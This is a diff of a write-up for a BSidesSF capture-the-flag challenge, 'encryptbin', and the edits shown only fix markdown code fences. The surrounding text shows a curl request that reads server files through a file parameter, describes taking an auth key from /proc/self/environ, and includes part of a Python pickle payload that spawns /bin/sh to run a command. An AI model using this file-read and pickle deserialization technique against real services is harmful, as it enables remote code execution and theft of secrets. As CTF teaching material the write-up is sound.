@@ -10,7 +10,7 @@ from sending any paste on /upload endpoint. What happens is that the server trie
 it's just gonna decrypt a plaintext so we would need to encrypt to get the original.
 
 To get the main.py : 
-`curl 'https://encryptbin-12f88e53.challenges.bsidessf.net/load?file=/home/ctf/main.py&key=3gV_dA_omm24yNMMMiPelA%3D%3D!gAN9cQAoWAMAAABrZXlxAUMQLvejbKz4xN5yWtPHbnBOAHECWAIAAABpdnEDQwhXEvA5rtSpBnEEdS4%3D' --output - ``
+`curl 'https://encryptbin-12f88e53.challenges.bsidessf.net/load?file=/home/ctf/main.py&key=3gV_dA_omm24yNMMMiPelA%3D%3D!gAN9cQAoWAMAAABrZXlxAUMQLvejbKz4xN5yWtPHbnBOAHECWAIAAABpdnEDQwhXEvA5rtSpBnEEdS4%3D' --output - `
 
 Then we use pickle to deserialize the key data into a key and an IV (the first part is mac, it's seperated from the data by '!'). The IV is missing 8 bytes so we just tried to add 8 null bytes and tried different block cipher modes. CTR mode worked : 
 
@@ -215,8 +215,9 @@ TEMPLATES_AUTO_RELOAD = True
 # App specific configs
 BASE_DIR = "/tmp/ebin"
 AUTH_KEY = os.getenv("AUTH_KEY", "--auth-key--")
-FLAG_PATH = "/home/flag/flag.txt"```
+FLAG_PATH = "/home/flag/flag.txt"
 
+```
 
 The `main.py` shows us that they're using an auth_key for the hmac so if we want to be able to have RCE through pickle (which is very vulnerable to that) we would need the 
 auth_key which we found on `proc/self/environ`. It was `good_work_but_need_a_shell`. Now we can build our own pickle data, serialize it and send it as the key. 
@@ -248,8 +249,8 @@ class RunBinSh(object):
         import subprocess
         return (subprocess.Popen, (('/bin/sh','-c','/home/flag/getflag > /tmp/flag'),0))
 
-print(pack_key())```
-
+print(pack_key())
+```
 
 
 Reading it was easy (encrypting just like before): 
